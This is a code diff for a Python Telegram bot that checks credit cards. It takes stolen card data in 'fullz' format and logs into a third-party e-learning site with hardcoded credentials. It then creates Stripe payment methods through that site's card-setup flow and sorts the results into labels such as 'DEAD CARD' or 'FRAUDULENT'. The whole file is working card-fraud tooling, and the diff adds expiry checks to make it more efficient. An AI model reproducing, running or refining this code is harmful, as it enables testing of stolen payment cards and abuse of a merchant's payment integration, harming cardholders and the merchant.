@@ -15,8 +15,7 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# ----------------------------------------
-# Fungsi bantu ekstrak substring
+# Helper function to extract substring between start and end
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -25,14 +24,35 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
-# ----------------------------------------
-# Fungsi utama yang membuat payment method di stripe
+# Create payment method with expiry validation
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
+        # Validate expiration date
+        mes = mes.zfill(2)
+        if len(ano) == 4:
+            ano = ano[-2:]
+
+        current_year = int(time.strftime("%y"))
+        current_month = int(time.strftime("%m"))
+
+        try:
+            expiry_month = int(mes)
+            expiry_year = int(ano)
+        except ValueError:
+            return json.dumps({"error": {"message": "Invalid expiry date"}})
+
+        if expiry_month < 1 or expiry_month > 12:
+            return json.dumps({"error": {"message": "Expiration Month Invalid ❌"}})
+        if expiry_year < current_year:
+            return json.dumps({"error": {"message": "Expiration Year Invalid ❌"}})
+        if expiry_year == current_year and expiry_month < current_month:
+            return json.dumps({"error": {"message": "Expiration Month Invalid ❌"}})
+
+        # Request headers etc.
         headers1 = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'max-age=0',
             'Connection': 'keep-alive',
@@ -48,14 +68,13 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'sec-ch-ua-platform': '"Linux"',
         }
 
-        # Ambil token login
+        # Get login token
         response = await session.get('https://elearntsg.com/login/', headers=headers1)
-
         login_token = gets(response.text, '"learndash-login-form" value="', '" />')
         if not login_token:
-            return "Failed to get login token"
+            return json.dumps({"error": {"message": "Failed to get login token"}})
 
-        # Login
+        # Login data
         headers2 = headers1.copy()
         headers2.update({
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -66,15 +85,14 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         data_login = {
             'learndash-login-form': login_token,
             'pmpro_login_form_used': '1',
-            'log': 'senryph@gmail.com',   # Ganti dengan akun login yang sesuai
-            'pwd': 'Senryph',               # Ganti password akun login
+            'log': 'parael10@gmail.com',   # Ganti akun login sesuai kamu
+            'pwd': 'parael',               # Ganti password sesuai kamu
             'wp-submit': 'Log In',
             'redirect_to': '',
         }
 
         response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)
 
-        # Navigasi halaman sesuai flow
         for url in [
             'https://elearntsg.com/activity-feed/',
             'https://elearntsg.com/my-account/payment-methods/',
@@ -84,7 +102,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
 
         nonce = gets(response.text, '"add_card_nonce":"', '"')
         if not nonce:
-            return "Failed to get add_card_nonce"
+            return json.dumps({"error": {"message": "Failed to get add_card_nonce"}})
 
         headers_stripe = {
             'accept': 'application/json',
@@ -106,10 +124,10 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'type':'card',
             'billing_details[name]':'parael senoman',
             'billing_details[email]':'parael10@gmail.com',
-            'card[number]': f'{cc}',
-            'card[cvc]': f'{cvv}',
-            'card[exp_month]': f'{mes}',
-            'card[exp_year]': f'{ano}',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mes,
+            'card[exp_year]': ano,
             'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
             'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
             'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
@@ -124,13 +142,11 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         }
 
         response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
-
         try:
             id = response.json()['id']
         except Exception:
             return response.text
 
-        # Kirim payment method ke server untuk setup intent
         headers_ajax = {
             'Accept': 'application/json, text/javascript, */*; q=0.01',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -164,8 +180,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     except Exception as e:
         return f"Exception: {str(e)}"
 
-# ----------------------------------------
-# Fungsi dari file defs.py yang kamu berikan
+# Function maps API response text to friendly message
 async def charge_resp(result):
     try:
         if (
@@ -216,7 +231,7 @@ async def charge_resp(result):
             response = "TRY AGAIN IN A FEW MINUTES ❌"
         elif "fraudulent" in result:
             response = "FRAUDULENT ❌ "
-        elif "setup_intent_authentication_failure" in result: 
+        elif "setup_intent_authentication_failure" in result:
             response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
         elif "invalid cvc" in result:
             response = "INVALID CVV ❌"
@@ -228,28 +243,28 @@ async def charge_resp(result):
             response = "PICKUP CARD ❌"
         elif "incorrect_number" in result:
             response = "INCORRECT CARD NUMBER ❌"
-        elif "Your card has expired." in result or "expired_card" in result: 
+        elif "Your card has expired." in result or "expired_card" in result:
             response = "EXPIRED CARD ❌"
-        elif "intent_confirmation_challenge" in result: 
+        elif "intent_confirmation_challenge" in result:
             response = "CAPTCHA ❌"
-        elif "Your card number is incorrect." in result: 
+        elif "Your card number is incorrect." in result:
             response = "INCORRECT CARD NUMBER ❌"
-        elif ( 
-            "Your card's expiration year is invalid." in result 
+        elif (
+            "Your card's expiration year is invalid." in result
             or "Your card's expiration year is invalid." in result
         ):
             response = "EXPIRATION YEAR INVALID ❌"
         elif (
-            "Your card's expiration month is invalid." in result 
+            "Your card's expiration month is invalid." in result
             or "invalid_expiry_month" in result
         ):
             response = "EXPIRATION MONTH INVALID ❌"
         elif "card is not supported." in result:
             response = "CARD NOT SUPPORTED ❌"
-        elif "invalid account" in result: 
+        elif "invalid account" in result:
             response = "DEAD CARD ❌"
         elif (
-            "Invalid API Key provided" in result 
+            "Invalid API Key provided" in result
             or "testmode_charges_only" in result
             or "api_key_expired" in result
             or "Your account cannot currently make live charges." in result
@@ -278,8 +293,7 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# ----------------------------------------
-# Fungsi multi_checking yang menggabungkan semuanya
+# Combines create_payment_method + charge_resp + measure time
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -316,7 +330,6 @@ async def multi_checking(fullz: str) -> str:
 
     return output
 
-# ----------------------------------------
 # Telegram bot handlers
 
 TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
@@ -353,7 +366,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # Optional sleep if you want to add delay (remove if you want faster checks)
+            # Optional sleep if you want to add delay (can be removed for speed)
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
